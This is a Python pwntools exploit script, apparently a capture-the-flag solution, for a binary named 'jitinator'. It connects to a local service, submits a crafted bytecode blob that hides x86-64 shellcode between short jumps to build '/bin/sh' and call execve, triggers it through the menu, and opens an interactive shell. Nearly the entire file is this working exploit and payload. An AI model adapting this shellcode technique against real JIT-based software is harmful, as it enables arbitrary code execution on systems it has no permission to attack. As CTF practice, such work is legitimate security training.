#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./jitinator
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './jitinator')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

def install_bytecode(bytecode):
    io.sendlineafter(b'>>',str(1).encode())
    io.sendlineafter(b'>>',bytecode)

#io = start()
io = remote('localhost',6969)

bytecode =b'P5\x02\x00WZ\xeb\x01\x02\x001\xf6\xeb\x01\x02\x00j;\xeb\x01\x02\x00X\x90\xeb\x01\x02\x00j/\xeb\x01\x02\x00[\x90\xeb\x01\x02\x00\x88\x1a\xeb\x01\x02\x00\xfe\xc2\xeb\x01\x02\x00jb\xeb\x01\x02\x00[\x90\xeb\x01\x02\x00\x88\x1a\xeb\x01\x02\x00\xfe\xc2\xeb\x01\x02\x00ji\xeb\x01\x02\x00[\x90\xeb\x01\x02\x00\x88\x1a\xeb\x01\x02\x00\xfe\xc2\xeb\x01\x02\x00jn\xeb\x01\x02\x00[\x90\xeb\x01\x02\x00\x88\x1a\xeb\x01\x02\x00\xfe\xc2\xeb\x01\x02\x00j/\xeb\x01\x02\x00[\x90\xeb\x01\x02\x00\x88\x1a\xeb\x01\x02\x00\xfe\xc2\xeb\x01\x02\x00js\xeb\x01\x02\x00[\x90\xeb\x01\x02\x00\x88\x1a\xeb\x01\x02\x00\xfe\xc2\xeb\x01\x02\x00jh\xeb\x01\x02\x00[\x90\xeb\x01\x02\x00\x88\x1a\xeb\x01\x02\x00\xfe\xc2\xeb\x01\x02\x00j\x00\xeb\x01\x02\x00[\x90\xeb\x01\x02\x00\x88\x1a\xeb\x01\x02\x00\xfe\xc2\xeb\x01\x02\x001\xd2\xeb\x01\x02\x00\x0f\x05\x90\x90\x02\x007\x137\x13\x02\x007\x137\x13\x02\x007\x137\x13\x02\x007\x137\x13\x02\x007\x137\x13\x02\x007\x137\x13\x02\x007\x137\x13\x02\x007\x137\x13\x02\x007\x137\x13\x02\x007\x137\x13\x02\x007\x137\x13\x02\x007\x137\x13\x02\x007\x137\x13\x01\x01\x01\x01\x01\x01'


install_bytecode(bytecode)

io.sendlineafter(b'>>',str(3).encode())

io.sendlineafter(b'>>',str(2).encode())

io.interactive()

